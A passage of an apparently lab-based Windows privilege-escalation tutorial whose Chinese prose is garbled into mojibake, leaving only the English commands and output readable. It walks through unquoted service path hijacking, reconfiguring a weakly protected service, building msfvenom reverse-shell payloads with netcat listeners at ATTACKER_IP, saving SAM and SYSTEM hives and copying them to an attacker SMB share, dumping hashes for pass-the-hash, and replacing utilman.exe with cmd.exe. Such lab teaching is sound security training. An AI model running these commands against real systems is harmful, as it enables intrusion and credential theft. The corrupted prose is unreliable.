ç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹å¦ä¸€é¡¹æ²¡æœ‰æ­£ç¡®æŠ¥ä»·çš„æœåŠ¡ï¼š C:\\&gt; sc qc \"disk sorter enterprise\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: disk sorter enterprise TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Disk Sorter Enterprise DEPENDENCIES : SERVICE_START_NAME : .\\svcusr2 å½“ SCM å°è¯•æ‰§è¡Œå…³è”çš„äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ç”±äºâ€œDisk Sorter Enterpriseâ€æ–‡ä»¶å¤¹çš„åç§°ä¸Šæœ‰ç©ºæ ¼ï¼Œå› æ­¤è¯¥å‘½ä»¤å˜å¾—ä¸æ˜ç¡®ï¼Œå¹¶ä¸” SCM ä¸çŸ¥é“æ‚¨æ­£åœ¨å°è¯•æ‰§è¡Œä»¥ä¸‹å“ªä¸€ä¸ªï¼š Command Argument 1 Argument 2 C:\\MyPrograms\\Disk.exe Sorter Enterprise\\bin\\disksrs.exe C:\\MyPrograms\\Disk Sorter.exe Enterprise\\bin\\disksrs.exe C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe è¿™ä¸å‘½ä»¤æç¤ºç¬¦å¦‚ä½•è§£æå‘½ä»¤æœ‰å…³ã€‚é€šå¸¸ï¼Œå½“æ‚¨å‘é€å‘½ä»¤æ—¶ï¼Œç©ºæ ¼å°†ç”¨ä½œå‚æ•°åˆ†éš”ç¬¦ï¼Œé™¤éå®ƒä»¬æ˜¯å¸¦å¼•å·çš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚è¿™æ„å‘³ç€æœªåŠ å¼•å·çš„å‘½ä»¤çš„â€œæ­£ç¡®â€è§£é‡Šæ˜¯æ‰§è¡Œ C:\\\\MyPrograms\\\\Disk.exe å¹¶å°†å…¶ä½™éƒ¨åˆ†ä½œä¸ºå‚æ•°ã€‚ SCM æ²¡æœ‰åƒå®ƒå¯èƒ½åº”è¯¥å‘ç”Ÿçš„é‚£æ ·å¤±è´¥ï¼Œè€Œæ˜¯å°è¯•å¸®åŠ©ç”¨æˆ·å¹¶å¼€å§‹æŒ‰ç…§è¡¨ä¸­æ‰€ç¤ºçš„é¡ºåºæœç´¢æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼š é¦–å…ˆï¼Œæœç´¢ C:\\\\MyPrograms\\\\Disk.exe ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æœåŠ¡å°†è¿è¡Œæ­¤å¯æ‰§è¡Œæ–‡ä»¶ã€‚ å¦‚æœåè€…ä¸å­˜åœ¨ï¼Œå®ƒå°†æœç´¢ C:\\\\MyPrograms\\\\Disk Sorter.exe ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æœåŠ¡å°†è¿è¡Œæ­¤å¯æ‰§è¡Œæ–‡ä»¶ã€‚ å¦‚æœåè€…ä¸å­˜åœ¨ï¼Œå®ƒå°†æœç´¢ C:\\\\MyPrograms\\\\Disk Sorter Enterprise\\\\bin\\\\disksrs.exe ã€‚æ­¤é€‰é¡¹é¢„è®¡ä¼šæˆåŠŸï¼Œå¹¶ä¸”é€šå¸¸ä¼šåœ¨é»˜è®¤å®‰è£…ä¸­è¿è¡Œã€‚ ä»è¿™ä¸ªè¡Œä¸ºæ¥çœ‹ï¼Œé—®é¢˜å°±æ˜¾è€Œæ˜“è§äº†ã€‚å¦‚æœæ”»å‡»è€…åˆ›å»ºäº†åœ¨é¢„æœŸæœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ä¹‹å‰æœç´¢çš„ä»»ä½•å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»–ä»¬å°±å¯ä»¥å¼ºåˆ¶æœåŠ¡è¿è¡Œä»»æ„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ è™½ç„¶è¿™å¬èµ·æ¥å¾®ä¸è¶³é“ï¼Œä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œå¤§å¤šæ•°æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶å°†å®‰è£…åœ¨ C:\\Program Files æˆ– C:\\Program Files (x86) ä¸‹ï¼Œéç‰¹æƒç”¨æˆ·æ— æ³•å†™å…¥ã€‚è¿™å¯ä»¥é˜²æ­¢ä»»ä½•æ˜“å—æ”»å‡»çš„æœåŠ¡è¢«åˆ©ç”¨ã€‚æ­¤è§„åˆ™ä¹Ÿæœ‰ä¾‹å¤–ï¼š - æŸäº›å®‰è£…ç¨‹åºæ›´æ”¹å·²å®‰è£…æ–‡ä»¶å¤¹çš„æƒé™ï¼Œä½¿æœåŠ¡å®¹æ˜“å—åˆ°æ”»å‡»ã€‚ - ç®¡ç†å‘˜å¯èƒ½å†³å®šå°†æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶å®‰è£…åœ¨éé»˜è®¤è·¯å¾„ä¸­ã€‚å¦‚æœè¿™æ ·çš„è·¯å¾„æ˜¯å…¨å±€å¯å†™çš„ï¼Œåˆ™è¯¥æ¼æ´å¯ä»¥è¢«åˆ©ç”¨ã€‚ åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œç®¡ç†å‘˜åœ¨ c:\\MyPrograms ä¸‹å®‰è£…äº†ç£ç›˜æ’åºå™¨äºŒè¿›åˆ¶æ–‡ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒç»§æ‰¿ C:\\ ç›®å½•çš„æƒé™ï¼Œå…è®¸ä»»ä½•ç”¨æˆ·åœ¨å…¶ä¸­åˆ›å»ºæ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ icacls æ¥æ£€æŸ¥ï¼š C:\\&gt;icacls c:\\MyPrograms c:\\MyPrograms NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Administrators:(I)(OI)(CI)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) BUILTIN\\Users:(I)(CI)(AD) BUILTIN\\Users:(I)(CI)(WD) CREATOR OWNER:(I)(OI)(CI)(IO)(F) Successfully processed 1 files; Failed processing 0 files BUILTIN\\\\Users ç»„æ‹¥æœ‰ADå’ŒWDæƒé™ï¼Œåˆ†åˆ«å…è®¸ç”¨æˆ·åˆ›å»ºå­ç›®å½•å’Œæ–‡ä»¶ã€‚ ä½¿ç”¨ msfvenom åˆ›å»º exe-service Payload å¹¶å°†å…¶ä¼ è¾“åˆ°ç›®æ ‡ä¸»æœºçš„è¿‡ç¨‹ä¸ä»¥å‰ç›¸åŒï¼Œå› æ­¤è¯·åƒä»¥å‰ä¸€æ ·åˆ›å»ºä»¥ä¸‹ Payload å¹¶å°†å…¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚æˆ‘ä»¬è¿˜å°†å¯åŠ¨ä¸€ä¸ªä¾¦å¬å™¨æ¥æ¥æ”¶åå‘ shell æ‰§è¡Œæ—¶çš„æƒ…å†µï¼š user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe user@attackerpc$ nc -lvp 4446 ä¸€æ—¦æœ‰æ•ˆè´Ÿè½½è¿›å…¥æœåŠ¡å™¨ï¼Œè¯·å°†å…¶ç§»åŠ¨åˆ°å¯èƒ½å‘ç”ŸåŠ«æŒçš„ä»»ä½•ä½ç½®ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†æŠŠæœ‰æ•ˆè´Ÿè½½ç§»åŠ¨åˆ° C:\\MyPrograms\\Disk.exe ã€‚æˆ‘ä»¬è¿˜å°†æˆäºˆæ¯ä¸ªäººå¯¹è¯¥æ–‡ä»¶çš„å®Œå…¨æƒé™ï¼Œä»¥ç¡®ä¿è¯¥æœåŠ¡å¯ä»¥æ‰§è¡Œè¯¥æ–‡ä»¶ï¼š C:\\&gt; move C:\\Users\\thm-unpriv\\rev-svc2.exe C:\\MyPrograms\\Disk.exe C:\\&gt; icacls C:\\MyPrograms\\Disk.exe /grant Everyone:F Successfully processed 1 files. æœåŠ¡é‡æ–°å¯åŠ¨åï¼Œæ‚¨çš„æœ‰æ•ˆè´Ÿè½½åº”è¯¥æ‰§è¡Œï¼š C:\\&gt; sc stop \"disk sorter enterprise\" C:\\&gt; sc start \"disk sorter enterprise\" ç»“æœï¼Œæ‚¨å°†è·å¾—å…·æœ‰ svcusr2 æƒé™çš„åå‘ shellï¼š user@attackerpc$ nc -lvp 4446 Listening on 0.0.0.0 4446 Connection received on 10.10.175.90 50650 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami wprivesc1\\svcusr2 4.6 ä¸å®‰å…¨çš„æœåŠ¡æƒé™ å¦‚æœæœåŠ¡çš„å¯æ‰§è¡Œ DACL é…ç½®è‰¯å¥½ï¼Œå¹¶ä¸”æ­£ç¡®å¼•ç”¨äº†æœåŠ¡çš„äºŒè¿›åˆ¶è·¯å¾„ï¼Œé‚£ä¹ˆæ‚¨ä»ç„¶æœ‰æœºä¼šåˆ©ç”¨è¯¥æœåŠ¡ã€‚å¦‚æœæœåŠ¡ DACLï¼ˆä¸æ˜¯æœåŠ¡çš„å¯æ‰§è¡Œ DACLï¼‰å…è®¸æ‚¨ä¿®æ”¹æœåŠ¡çš„é…ç½®ï¼Œæ‚¨å°†èƒ½å¤Ÿé‡æ–°é…ç½®è¯¥æœåŠ¡ã€‚è¿™å°†å…è®¸æ‚¨æŒ‡å‘æ‰€éœ€çš„ä»»ä½•å¯æ‰§è¡Œæ–‡ä»¶å¹¶ä½¿ç”¨æ‚¨å–œæ¬¢çš„ä»»ä½•å¸æˆ·è¿è¡Œå®ƒï¼ŒåŒ…æ‹¬ SYSTEM æœ¬èº«ã€‚ è¦ä»å‘½ä»¤è¡Œæ£€æŸ¥æœåŠ¡ DACLï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ Sysinternals å¥—ä»¶ä¸­çš„ Accesschkã€‚ä¸ºäº†æ‚¨çš„æ–¹ä¾¿ï¼Œå¯åœ¨ C:\\\\tools è·å–å‰¯æœ¬ã€‚æ£€æŸ¥ thmservice æœåŠ¡ DACL çš„å‘½ä»¤æ˜¯ï¼š C:\\tools\\AccessChk&gt; accesschk64.exe -qlc thmservice [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_PAUSE_CONTINUE SERVICE_START SERVICE_STOP SERVICE_USER_DEFINED_CONTROL READ_CONTROL [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Users SERVICE_ALL_ACCESS è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° BUILTIN\\\\Users ç»„æ‹¥æœ‰SERVICE_ALL_ACCESSæƒé™ï¼Œè¿™æ„å‘³ç€ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥é‡æ–°é…ç½®æœåŠ¡ã€‚ åœ¨æ›´æ”¹æœåŠ¡ä¹‹å‰ï¼Œè®©æˆ‘ä»¬æ„å»ºå¦ä¸€ä¸ª exe-service åå‘ shellï¼Œå¹¶åœ¨æ”»å‡»è€…çš„è®¡ç®—æœºä¸Šå¯åŠ¨å®ƒçš„ä¾¦å¬å™¨ï¼š user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe user@attackerpc$ nc -lvp 4447 ç„¶åï¼Œæˆ‘ä»¬å°†åå‘ shell å¯æ‰§è¡Œæ–‡ä»¶ä¼ è¾“åˆ°ç›®æ ‡æœºå™¨å¹¶å°†å…¶å­˜å‚¨åœ¨ C:\\Users\\thm-unpriv\\rev-svc3.exe ä¸­ã€‚è¯·éšæ„ä½¿ç”¨ wget ä¼ è¾“æ‚¨çš„å¯æ‰§è¡Œæ–‡ä»¶å¹¶å°†å…¶ç§»åŠ¨åˆ°æ‰€éœ€çš„ä½ç½®ã€‚è¯·è®°ä½æˆäºˆæ¯ä¸ªäººæ‰§è¡Œæ‚¨çš„æœ‰æ•ˆè´Ÿè½½çš„æƒé™ï¼š C:\\&gt; icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:F è¦æ›´æ”¹æœåŠ¡å…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶å’Œå¸æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼ˆä½¿ç”¨ sc.exe æ—¶è¯·æ³¨æ„ç­‰å·åé¢çš„ç©ºæ ¼ï¼‰ï¼š C:\\&gt; sc config THMService binPath= \"C:\\Users\\thm-unpriv\\rev-svc3.exe\" obj= LocalSystem è¯·æ³¨æ„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»ä½•å¸æˆ·æ¥è¿è¡Œè¯¥æœåŠ¡ã€‚æˆ‘ä»¬é€‰æ‹© LocalSystemï¼Œå› ä¸ºå®ƒæ˜¯å¯ç”¨çš„æœ€é«˜ç‰¹æƒå¸æˆ·ã€‚è¦è§¦å‘æˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå‰©ä¸‹çš„å°±æ˜¯é‡æ–°å¯åŠ¨æœåŠ¡ï¼š C:\\&gt; sc stop THMService C:\\&gt; sc start THMService æˆ‘ä»¬å°†åœ¨æ”»å‡»è€…çš„æœºå™¨ä¸Šæ”¶åˆ°ä¸€ä¸ªå…·æœ‰ç³»ç»Ÿæƒé™çš„ shellï¼š user@attackerpc$ nc -lvp 4447 Listening on 0.0.0.0 4447 Connection received on 10.10.175.90 50650 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami NT AUTHORITY\\SYSTEM tips æƒé™æ˜¯å¸æˆ·æ‰§è¡Œç‰¹å®šç³»ç»Ÿç›¸å…³ä»»åŠ¡æ‰€æ‹¥æœ‰çš„æƒåˆ©ã€‚è¿™äº›ä»»åŠ¡å¯ä»¥åƒå…³é—­è®¡ç®—æœºçš„æƒé™ä¸€æ ·ç®€å•ï¼Œä¹Ÿå¯ä»¥åƒç»•è¿‡æŸäº›åŸºäº DACL çš„è®¿é—®æ§åˆ¶çš„æƒé™ä¸€æ ·ç®€å•ã€‚ æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ç»„åˆ†é…çš„æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼š whoami /priv æ­¤å¤„æä¾›äº† Windows ç³»ç»Ÿä¸Šå¯ç”¨æƒé™çš„å®Œæ•´åˆ—è¡¨ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œåªæœ‰é‚£äº›å…è®¸æˆ‘ä»¬åœ¨ç³»ç»Ÿä¸­å‡çº§çš„æƒé™æ‰æœ‰æ„ä¹‰ã€‚æ‚¨å¯ä»¥åœ¨ Priv2Admin Github é¡¹ç›®ä¸Šæ‰¾åˆ°å¯åˆ©ç”¨æƒé™çš„å®Œæ•´åˆ—è¡¨ã€‚ è™½ç„¶æˆ‘ä»¬ä¸ä¼šé€ä¸€æŸ¥çœ‹ï¼Œä½†æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•æ»¥ç”¨æ‚¨å¯ä»¥æ‰¾åˆ°çš„ä¸€äº›æœ€å¸¸è§çš„ç‰¹æƒã€‚ 4.7 SeBackup / SeRestore SeBackup å’Œ SeRestore æƒé™å…è®¸ç”¨æˆ·è¯»å–å’Œå†™å…¥ç³»ç»Ÿä¸­çš„ä»»ä½•æ–‡ä»¶ï¼Œå¿½ç•¥ä»»ä½• DACLã€‚æ­¤æƒé™èƒŒåçš„æƒ³æ³•æ˜¯å…è®¸æŸäº›ç”¨æˆ·ä»ç³»ç»Ÿæ‰§è¡Œå¤‡ä»½ï¼Œè€Œæ— éœ€å®Œå…¨ç®¡ç†æƒé™ã€‚ æœ‰äº†è¿™ç§èƒ½åŠ›ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å¤šç§æŠ€æœ¯è½»æ¾æå‡ç³»ç»Ÿæƒé™ã€‚æˆ‘ä»¬å°†ç ”ç©¶çš„æ–¹æ³•åŒ…æ‹¬å¤åˆ¶ SAM å’Œ SYSTEM æ³¨å†Œè¡¨é…ç½®å•å…ƒä»¥æå–æœ¬åœ°ç®¡ç†å‘˜çš„å¯†ç å“ˆå¸Œå€¼ã€‚ æ¥ä¸‹æ¥å®æ“çš„å¸æˆ·å±äºâ€œBackup Operatorsâ€ç»„ï¼Œé»˜è®¤æƒ…å†µä¸‹è¢«æˆäºˆ SeBackup å’Œ SeRestore æƒé™ã€‚æˆ‘ä»¬éœ€è¦ä½¿ç”¨â€œä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€â€é€‰é¡¹æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æ‰èƒ½ä½¿ç”¨è¿™äº›æƒé™ã€‚æˆ‘ä»¬å°†è¢«è¦æ±‚å†æ¬¡è¾“å…¥å¯†ç ä»¥è·å¾—æå‡çš„æ§åˆ¶å°ï¼š è¿›å…¥å‘½ä»¤æç¤ºç¬¦åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥æˆ‘ä»¬çš„æƒé™ï¼š C:\\&gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled è¦å¤‡ä»½ SAM å’Œ SYSTEM å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\&gt; reg save hklm\\system C:\\Users\\THMBackup\\system.hive The operation completed successfully. C:\\&gt; reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive The operation completed successfully. è¿™å°†åˆ›å»ºå‡ ä¸ªåŒ…å«æ³¨å†Œè¡¨é…ç½®å•å…ƒå†…å®¹çš„æ–‡ä»¶ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SMB æˆ–ä»»ä½•å…¶ä»–å¯ç”¨æ–¹æ³•å°†è¿™äº›æ–‡ä»¶å¤åˆ¶åˆ°æ”»å‡»è€…è®¡ç®—æœºã€‚å¯¹äº SMBï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ impacket çš„ smbserver.py åœ¨ AttackBox çš„å½“å‰ç›®å½•ä¸­å¯åŠ¨ä¸€ä¸ªå¸¦æœ‰ç½‘ç»œå…±äº«çš„ç®€å• SMB æœåŠ¡å™¨ï¼š user@attackerpc$ mkdir share user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share è¿™å°†åˆ›å»ºä¸€ä¸ªåä¸º public çš„å…±äº«ï¼ŒæŒ‡å‘ share ç›®å½•ï¼Œè¯¥ç›®å½•éœ€è¦å½“å‰ Windows ä¼šè¯çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Windows æœºå™¨ä¸­ä½¿ç”¨ copy å‘½ä»¤å°†è¿™ä¸¤ä¸ªæ–‡ä»¶ä¼ è¾“åˆ° AttackBoxï¼š C:\\&gt; copy C:\\Users\\THMBackup\\sam.hive \\\\ATTACKER_IP\\public\\ C:\\&gt; copy C:\\Users\\THMBackup\\system.hive \\\\ATTACKER_IP\\public\\ å¹¶ä½¿ç”¨ impacket æ£€ç´¢ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼š user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: æˆ‘ä»¬ç»ˆäºå¯ä»¥ä½¿ç”¨ç®¡ç†å‘˜çš„å“ˆå¸Œæ¥æ‰§è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»å¹¶è·å¾—å…·æœ‰ç³»ç»Ÿæƒé™çš„ç›®æ ‡è®¡ç®—æœºçš„è®¿é—®æƒé™ï¼š user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Requesting shares on 10.10.175.90..... [*] Found writable share ADMIN$ [*] Uploading file nfhtabqO.exe [*] Opening SVCManager on 10.10.175.90..... [*] Creating service RoLE on 10.10.175.90..... [*] Starting service RoLE..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt; whoami nt authority\\system 4.8 SeTakeOwnership SeTakeOwnership æƒé™å…è®¸ç”¨æˆ·è·å–ç³»ç»Ÿä¸Šä»»ä½•å¯¹è±¡çš„æ‰€æœ‰æƒï¼ŒåŒ…æ‹¬æ–‡ä»¶å’Œæ³¨å†Œè¡¨é¡¹ï¼Œè¿™ä¸ºæ”»å‡»è€…æå‡æƒé™æä¾›äº†å¤šç§å¯èƒ½æ€§ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æœç´¢ä½œä¸º SYSTEM è¿è¡Œçš„æœåŠ¡å¹¶è·å–æ‰€æœ‰æƒæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç„¶è€Œï¼Œå¯¹äºè¿™é¡¹ä»»åŠ¡ï¼Œæˆ‘ä»¬å°†é‡‡å–ä¸åŒçš„è·¯çº¿ã€‚ è¦è·å¾— SeTakeOwnership æƒé™ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨â€œä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€â€é€‰é¡¹æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ã€‚æˆ‘ä»¬å°†è¢«è¦æ±‚è¾“å…¥å¯†ç ä»¥è·å¾—æå‡çš„æ§åˆ¶å°ï¼š è¿›å…¥å‘½ä»¤æç¤ºç¬¦åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥æˆ‘ä»¬çš„æƒé™ï¼š C:\\&gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ======================================== ======== SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled è¿™æ¬¡æˆ‘ä»¬å°†æ»¥ç”¨ utilman.exe æ¥å‡çº§æƒé™ã€‚ Utilman æ˜¯ä¸€ä¸ªå†…ç½®çš„ Windows åº”ç”¨ç¨‹åºï¼Œç”¨äºåœ¨é”å®šå±å¹•æœŸé—´æä¾›â€œè½»æ¾è®¿é—®â€é€‰é¡¹ï¼š ç”±äº Utilman æ˜¯ä»¥ SYSTEM æƒé™è¿è¡Œçš„ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬å°†åŸå§‹äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢ä¸ºæˆ‘ä»¬å–œæ¬¢çš„ä»»ä½•æœ‰æ•ˆè´Ÿè½½ï¼Œæˆ‘ä»¬å°†æœ‰æ•ˆåœ°è·å¾— SYSTEM æƒé™ã€‚ç”±äºæˆ‘ä»¬å¯ä»¥æ‹¥æœ‰ä»»ä½•æ–‡ä»¶çš„æ‰€æœ‰æƒï¼Œå› æ­¤æ›¿æ¢å®ƒæ˜¯å¾®ä¸è¶³é“çš„ã€‚ è¦æ›¿æ¢ utilmanï¼Œæˆ‘ä»¬å°†é¦–å…ˆä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–å®ƒçš„æ‰€æœ‰æƒï¼š C:\\&gt; takeown /f C:\\Windows\\System32\\Utilman.exe SUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\". è¯·æ³¨æ„ï¼Œæˆä¸ºæ–‡ä»¶çš„æ‰€æœ‰è€…å¹¶ä¸ä¸€å®šæ„å‘³ç€æ‚¨æ‹¥æœ‰è¯¥æ–‡ä»¶çš„æƒé™ï¼Œä½†ä½œä¸ºæ‰€æœ‰è€…ï¼Œæ‚¨å¯ä»¥ä¸ºè‡ªå·±åˆ†é…æ‰€éœ€çš„ä»»ä½•æƒé™ã€‚è¦ä¸ºæ‚¨çš„ç”¨æˆ·æˆäºˆ utilman.exe çš„å®Œå…¨æƒé™ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\&gt; icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F processed file: Utilman.exe Successfully processed 1 files; Failed processing 0 files ä¹‹åï¼Œæˆ‘ä»¬å°†ç”¨ cmd.exe çš„å‰¯æœ¬æ›¿æ¢ utilman.exeï¼š C:\\Windows\\System32\\&gt; copy cmd.exe utilman.exe 1 file(s) copied. è¦è§¦å‘ utilmanï¼Œæˆ‘ä»¬å°†ä»å¼€å§‹æŒ‰é’®é”å®šå±å¹•ï¼š æœ€åï¼Œç»§ç»­å•å‡»â€œè½»æ¾è®¿é—®â€æŒ‰é’®ï¼Œè¯¥æŒ‰é’®å°†ä»¥ç³»ç»Ÿæƒé™è¿è¡Œ utilman.exeã€‚ç”±äºæˆ‘ä»¬å°†å…¶æ›¿æ¢ä¸º cmd.exe å‰¯æœ¬ï¼Œå› æ­¤æˆ‘ä»¬å°†è·å¾—å…·æœ‰ SYSTEM æƒé™çš„å‘½ä»¤æç¤ºç¬¦ï¼š 4.9 SeImpersonate / SeAssignPrimaryToken è¿™äº›æƒé™å…è®¸è¿›ç¨‹æ¨¡æ‹Ÿå…¶ä»–ç”¨æˆ·å¹¶ä»£è¡¨ä»–ä»¬æ‰§è¡Œæ“ä½œã€‚æ¨¡æ‹Ÿé€šå¸¸åŒ…æ‹¬èƒ½å¤Ÿåœ¨å¦ä¸€ä¸ªç”¨æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸‹ç”Ÿæˆè¿›ç¨‹æˆ–çº¿ç¨‹ã€‚ å½“æ‚¨è€ƒè™‘ FTP æœåŠ¡å™¨çš„å·¥ä½œåŸç†æ—¶ï¼Œå°±å¾ˆå®¹æ˜“ç†è§£æ¨¡æ‹Ÿã€‚ FTP æœåŠ¡å™¨å¿…é¡»é™åˆ¶ç”¨æˆ·åªèƒ½è®¿é—®ä»–ä»¬åº”è¯¥è¢«å…è®¸æŸ¥çœ‹çš„æ–‡ä»¶ã€‚ å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªä½¿ç”¨ç”¨æˆ· ftp è¿è¡Œçš„ FTP æœåŠ¡ã€‚åœ¨æ²¡æœ‰æ¨¡æ‹Ÿçš„æƒ…å†µä¸‹ï¼Œå¦‚æœç”¨æˆ· Ann ç™»å½• FTP æœåŠ¡å™¨å¹¶å°è¯•è®¿é—®å¥¹çš„æ–‡ä»¶ï¼ŒFTP æœåŠ¡å°†å°è¯•ä½¿ç”¨å…¶è®¿é—®ä»¤ç‰Œè€Œä¸æ˜¯ Ann çš„è®¿é—®ä»¤ç‰Œæ¥è®¿é—®å®ƒä»¬ï¼š ä½¿ç”¨ ftp ä»¤ç‰Œä¸æ˜¯æœ€å¥½çš„ä¸»æ„æœ‰ä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š - ä¸ºäº†æ­£ç¡®æä¾›æ–‡ä»¶ï¼Œ ftp ç”¨æˆ·éœ€è¦å¯ä»¥è®¿é—®å®ƒä»¬ã€‚åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼ŒFTP æœåŠ¡å°†èƒ½å¤Ÿè®¿é—® Ann çš„æ–‡ä»¶ï¼Œä½†ä¸èƒ½è®¿é—® Bill çš„æ–‡ä»¶ï¼Œå› ä¸º Bill æ–‡ä»¶ä¸­çš„ DACL ä¸å…è®¸ç”¨æˆ· ftp ã€‚è¿™å¢åŠ äº†å¤æ‚æ€§ï¼Œå› ä¸ºæˆ‘ä»¬å¿…é¡»ä¸ºæ¯ä¸ªæä¾›çš„æ–‡ä»¶/ç›®å½•æ‰‹åŠ¨é…ç½®ç‰¹å®šæƒé™ã€‚ - 